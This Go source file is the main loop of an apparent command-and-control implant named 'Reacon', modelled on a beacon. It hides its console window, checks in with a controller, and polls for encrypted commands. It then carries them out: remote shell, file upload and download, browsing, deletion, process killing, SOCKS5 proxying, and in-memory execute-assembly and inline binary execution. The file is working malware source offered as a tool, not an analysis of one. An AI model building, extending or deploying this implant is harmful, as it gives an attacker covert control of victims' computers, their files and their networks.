package main

import (
	"Reacon/pkg/communication"
	"Reacon/pkg/config"
	"Reacon/pkg/encrypt"
	"Reacon/pkg/services"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"time"
)

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}
	errConsole := services.HideConsole()
	if errConsole != nil && errConsole.Error() != "" {
		fmt.Println(errConsole)
	}
	// windows 下设置不需要DPI缩放
	errDPI := services.ProcessDPIAware()
	if errDPI != nil && errDPI.Error() != "" {
		fmt.Println(errDPI)
	}

	errFirstBlood := communication.FirstBlood()
	if errFirstBlood != nil {
		fmt.Println(errFirstBlood)
		time.Sleep(3 * time.Second)
		return
	}

	// 开启监听 从服务端发送来的命令
	for {
		data, err := communication.PullCommand()
		// 处理控制端下发的命令
		if data != nil && err == nil {
			totalLen := len(data)
			if totalLen > 0 {
				decrypted, err := encrypt.Decrypt(data)
				if err != nil {
					//fmt.Println(err)
					communication.ErrorProcess(err)
					continue
				}
				if len(decrypted) < 4 {
					continue
				}
				cmdType := binary.BigEndian.Uint32(decrypted[:4])
				cmdBuf := decrypted[4:]
				if cmdBuf != nil {
					var err error
					var callbackType int
					var result []byte
					switch cmdType {
					case services.SHELL: // shell
						result, err = services.CmdShell(cmdBuf)
						callbackType = 0
					case services.UploadStart: //upload 第一次
						result, err = services.CmdUpload(cmdBuf, true)
						callbackType = 0
					case services.UploadLoop: //upload 后续的upload
						result, err = services.CmdUpload(cmdBuf, false)
						callbackType = 0
					case services.DOWNLOAD: //download   2
						result, err = services.CmdDownload(cmdBuf)
						callbackType = 0
					case services.FileBrowse: //File Browser
						result, err = services.CmdFileBrowse(cmdBuf)
						callbackType = services.FileBrowse
					case services.CD: //cd
						result, err = services.CmdCd(cmdBuf)
						callbackType = 0
					case services.SLEEP: //sleep
						result, err = services.CmdSleep(cmdBuf)
						callbackType = 0
					case services.PAUSE: //pause
						result, err = services.CmdPause(cmdBuf)
						callbackType = 0
					case services.PWD: //pwd
						result, err = services.CmdPwd()
						callbackType = 0
					case services.EXIT: //exit
						result, err = services.CmdExit()
						if err == nil {
							return
						}
						callbackType = 0
					case services.EXECUTE: // windows 后台执行程序
						result, err = services.CmdExecute(cmdBuf)
						callbackType = 0
					case services.PS: // ps 列出进程
						result, err = services.CmdPs()
						callbackType = services.PS
					case services.KILL: //kill
						result, err = services.CmdKill(cmdBuf)
						callbackType = 0
					case services.MKDIR: //mkdir
						result, err = services.CmdMkdir(cmdBuf)
						callbackType = 0
					case services.DRIVES: //list drives  2
						result, err = services.CmdDrives()
						callbackType = services.DRIVES
					case services.RM: //rm
						result, err = services.CmdRm(cmdBuf)
						callbackType = 0
					case services.CP: //cp
						result, err = services.CmdCp(cmdBuf)
						callbackType = 0
					case services.MV: //mv
						result, err = services.CmdMv(cmdBuf)
						callbackType = 0
					case services.FileContent:
						result, err = services.GetFileContent(cmdBuf)
						callbackType = 0
					case services.Scoks5Start:
						result, err = services.SocksConnect(cmdBuf)
						callbackType = 0
					case services.Scoks5Close:
						result, err = services.SocksClose()
						callbackType = 0
					case services.ExecuteAssembly:
						result, err = services.Execute_Assembly(cmdBuf)
						callbackType = 0
					case services.InlineBin:
						result, err = services.Inline_bin(cmdBuf)
						callbackType = 0
					default:
						err = errors.New("not supported command")
					}
					// convert charset here
					if err != nil {
						communication.ErrorProcess(err)
					} else {
						if callbackType >= 0 {
							communication.DataProcess(callbackType, result)
						}
					}
				}
			}
		} else if err != nil {
			communication.ErrorProcess(err)
		}
		waitTime, err := services.CallbackTime()
		if err != nil {
			//fmt.Println(err)
			communication.ErrorProcess(err)
		}
		time.Sleep(waitTime)

	}
}
